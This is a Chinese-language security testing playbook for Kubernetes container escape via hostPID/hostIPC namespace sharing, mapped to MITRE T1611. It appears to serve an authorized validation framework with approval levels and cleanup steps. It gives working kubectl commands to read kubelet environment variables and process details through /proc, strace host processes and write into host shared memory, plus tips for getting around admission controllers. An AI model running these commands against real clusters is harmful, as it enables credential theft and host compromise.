---
source: manual
confidence: high
platforms: [k8s]
required_tools: []
execution_contexts: [L0, L1, L2]
max_verification_level: L2
destructive: false
mapped_attack_surfaces: [AS-1.9]
mapped_compliance_families: [Pod安全, 命名空间共享]
---

# hostpid-hostipc-escape — hostPID/hostIPC 命名空间逃逸

Pod 配置 `hostPID: true` 或 `hostIPC: true` 时，容器与宿主机共享 PID 或 IPC 命名空间，攻击者可查看/操作宿主机进程与共享内存，实现信息窃取或进程注入。

---

## 1. 前置条件

- Pod 的 `spec.hostPID` 设为 `true`（共享宿主机 PID 命名空间）
- 或 Pod 的 `spec.hostIPC` 设为 `true`（共享宿主机 IPC 命名空间）
- Pod 未被 PodSecurity Standards 的 `restricted` 级别策略拦截

检查命令：
```bash
# [L0] 宿主机观察：检查 hostPID 标志
kubectl get pod <pod-name> -n <ns> -o jsonpath='{.spec.hostPID}'
# 期望输出: true

# [L0] 宿主机观察：检查 hostIPC 标志
kubectl get pod <pod-name> -n <ns> -o jsonpath='{.spec.hostIPC}'
# 期望输出: true
```

## 2. 探测命令

```bash
# [L0] 宿主机观察：确认 hostPID 配置
kubectl get pod <pod-name> -n <ns> -o yaml | grep -E 'hostPID|hostIPC'
# 期望输出: hostPID: true 或 hostIPC: true

# [L1] 容器内观察（hostPID=true）：列出宿主机所有进程
kubectl exec -n <ns> <pod-name> -- ps aux | wc -l
# 期望输出: 进程数远超容器自身进程（数十至数百，含宿主机 kubelet/etcd 等系统进程）

# [L1] 容器内观察（hostPID=true）：确认可看到宿主机关键进程
kubectl exec -n <ns> <pod-name> -- ps aux | grep -E 'kubelet|etcd|containerd|dockerd'
# 期望输出: 显示宿主机上运行的 kubelet/etcd 等进程（PID 与路径）

# [L1] 容器内观察（hostIPC=true）：列出宿主机共享内存段
kubectl exec -n <ns> <pod-name> -- ipcs -m
# 期望输出: 显示宿主机现有共享内存段（含非容器自身的 shmid）

# [L1] 容器内观察：对比容器自身 PID 1 与宿主机 PID 1
kubectl exec -n <ns> <pod-name> -- cat /proc/1/cmdline | tr '\0' ' '
# 期望输出: 若 hostPID=true，输出为宿主机 init/systemd 进程命令行，而非容器进程
```

## 3. 攻击验证

```bash
# [L1] 容器内攻击验证（hostPID）：通过宿主机进程信息窃取 kubelet 启动参数
kubectl exec -n <ns> <pod-name> -- ps aux | grep kubelet
# 期望输出: 显示 kubelet PID 及完整启动参数（含 --client-ca-file 路径等敏感配置）
# 记录 kubelet PID

# [L1] 容器内攻击验证（hostPID）：通过 /proc/<pid> 读取 kubelet 环境变量
KUBELET_PID=$(kubectl exec -n <ns> <pod-name> -- ps aux | grep kubelet | grep -v grep | awk '{print $2}' | head -1)
kubectl exec -n <ns> <pod-name> -- cat /proc/${KUBELET_PID}/environ | tr '\0' '\n' | head -20
# 期望输出: kubelet 进程环境变量（可能含证书路径、认证参数）

# [L2] 容器内攻击验证（hostPID）：通过 strace 监控宿主机目标进程系统调用
kubectl exec -n <ns> <pod-name> -- sh -c "strace -p ${KUBELET_PID} -e trace=network -o /tmp/kubelet-trace.log & sleep 5 && cat /tmp/kubelet-trace.log | head -10"
# 期望输出: kubelet 的网络系统调用（connect/accept 等），可获知 API server 通信端口

# [L2] 容器内攻击验证（hostIPC）：向宿主机共享内存写入数据
kubectl exec -n <ns> <pod-name> -- sh -c '
echo "IPC injection poc" | dd of=/dev/shm/escape-ipc-marker bs=1 2>/dev/null && \
ls -la /dev/shm/escape-ipc-marker'
# 期望输出: 宿主机共享内存出现 escape-ipc-marker 文件

# [L2] 清理
kubectl exec -n <ns> <pod-name> -- rm /dev/shm/escape-ipc-marker 2>/dev/null
# 期望输出: 无报错
```

## 4. 差分证明

```bash
# [L0] 攻击前环境快照：记录正常容器的进程数
kubectl exec -n <ns> <normal-pod> -- ps aux | wc -l
# 期望输出: 少量进程（通常 1-5 个，仅容器内进程）

# [L0] 攻击后对比：hostPID 容器的进程数
kubectl exec -n <ns> <pod-name> -- ps aux | wc -l
# 期望输出: 大量进程（数十至数百，含宿主机全部进程）

# [L1] 攻击前：正常容器无法看到宿主机 kubelet 进程
kubectl exec -n <ns> <normal-pod> -- ps aux | grep kubelet
# 期望输出: 无输出（正常容器隔离宿主机进程）

# [L1] 攻击后：hostPID 容器可看到宿主机 kubelet 进程
kubectl exec -n <ns> <pod-name> -- ps aux | grep kubelet
# 期望输出: 显示宿主机 kubelet 进程 → 证明 PID 命名空间逃逸

# [L2] 攻击前：宿主机 /dev/shm 无 escape-ipc-marker
ls -la /dev/shm/ | grep escape-ipc-marker
# 期望输出: 无输出

# [L2] 攻击后：宿主机 /dev/shm 出现写入文件
ls -la /dev/shm/ | grep escape-ipc-marker
# 期望输出: escape-ipc-marker（容器写入出现在宿主机层面）→ 证明 IPC 命名空间逃逸
```

差分结论：攻击前正常容器进程隔离完好，攻击后 `hostPID=true` 容器可遍历宿主机全部进程并读取其环境变量/系统调用，`hostIPC=true` 容器写入的数据出现在宿主机共享内存，证明命名空间逃逸成功。

## 5. 绕过策略

```bash
# [L1] 检查 PodSecurity Standards 是否生效
kubectl get podsecuritypolicy 2>/dev/null || kubectl get validatingadmissionpolicy 2>/dev/null
# 若存在 restricted 级别策略且已生效 → hostPID/hostIPC 创建时有拒绝记录

# [L1] 检查 OPA Gatekeeper / Kyverno 等准入控制器
kubectl get constrainttemplate 2>/dev/null
# 若存在禁止 hostPID 的约束 → Pod 创建时被拦截

# 绕过方式：
# - [L1] 若 hostPID 被限制但 hostIPC 未限制（策略不完整），优先利用 hostIPC 进行 IPC 逃逸
# - [L1] 若 ps 命令被裁剪的镜像移除，通过遍历 /proc/<pid>/ 目录手动读取进程信息
# - [L2] 若 strace 不可用，通过 /proc/<pid>/fd/ 读取进程打开的文件描述符（含 socket、证书文件）
# - [L1] 若 cat /proc/<pid>/environ 报错权限不足，尝试 /proc/<pid>/cmdline /proc/<pid>/maps 获取信息
```

## 6. 证伪条件

```bash
# [L0] hostPID 和 hostIPC 均为 false
kubectl get pod <pod-name> -n <ns> -o jsonpath='{.spec.hostPID} {.spec.hostIPC}'
# 输出: false false 或无输出 → 证伪

# [L1] 容器内进程数与正常容器一致（仅自身进程）
kubectl exec -n <ns> <pod-name> -- ps aux | wc -l
# 输出: 个位数 → 证伪

# [L1] 容器内无法看到宿主机 kubelet 进程
kubectl exec -n <ns> <pod-name> -- ps aux | grep kubelet
# 输出: 无匹配 → 证伪

# [L1] 容器内 IPC 资源仅为自身创建
kubectl exec -n <ns> <pod-name> -- ipcs -m | grep -v 'no segments'
# 输出: 仅容器自身 shmid 或无段 → 证伪

# [L1] 容器 PID 1 为容器进程而非宿主机 init
kubectl exec -n <ns> <pod-name> -- cat /proc/1/cmdline | tr '\0' ' '
# 输出: 容器入口命令而非 systemd/init → 证伪
```

## 7. 审批级别

- **L2** 容器内攻击验证（strace 宿主机进程、写入宿主机共享内存）→ **Level 3**（操作宿主机进程/内存，需人工确认）
- **L1** 容器内探测命令（ps、ipcs、cat /proc）→ **Level 2**（只读探测，自动执行）
- **L0** 宿主机观察命令（kubectl get pod）→ **Level 1**（只读侦察，自动执行）
- 破坏性标注：否
- 最高验证层级：L2

## 8. MITRE ATT&CK

- **Tactic**: Discovery / Privilege Escalation
- **Technique ID**: T1611
- **Technique Name**: Escape to Host
- **描述**: 攻击者利用 `hostPID`/`hostIPC` 共享命名空间，从容器内枚举宿主机进程并读取其环境变量/系统调用，或向宿主机 IPC 共享内存写入数据，实现宿主机进程空间侦察与命名空间逃逸。